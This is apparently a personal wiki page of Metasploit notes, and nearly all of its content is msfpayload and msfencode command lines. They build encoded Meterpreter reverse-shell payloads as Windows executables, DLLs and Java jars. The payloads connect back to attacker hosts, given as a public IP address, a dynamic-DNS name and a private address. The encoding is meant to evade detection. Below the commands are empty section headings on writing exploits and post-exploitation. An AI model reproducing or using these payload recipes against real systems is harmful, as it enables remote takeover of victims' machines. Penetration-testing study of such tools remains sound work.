<!-- TITLE: Metasploit Main -->
<!-- SUBTITLE: A quick summary of Metasploit Main -->


[Back to Tools](/tools)

[Metasploit Site](https://www.metasploit.com/)
# MSFVenom


Following is pretty old.  MSFvenom instead of msfpayload, but things I need to look up.
Encrypting
./msfpayload windows/meterpreter/reverse_tcp LHOST=71.229.140.156 LPORT=9999 R | ./msfencode -t exe > meterp.exe
[*] x86/shikata_ga_nai succeeded with size 318 (iteration=1)

NEW ONE:
./msfpayload windows/meterpreter/reverse_tcp_dns LHOST=olympus.dyns.cx LPORT=9998 R | ./msfencode -c 10 -t exe > meterp.exe

Make a DLL exploit with msfpayload
msfpayload windows/exec CMD=calc.exe D > test.dll

Java Jar file (note the [R]aw and not [J]avascript output.)
./msfpayload java/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT 9996 R > file.jar 

# Known Attack Patterns
# Writing Exploits
# Post Module Tricks
# MSFDB Commands
# MSF RPC Connections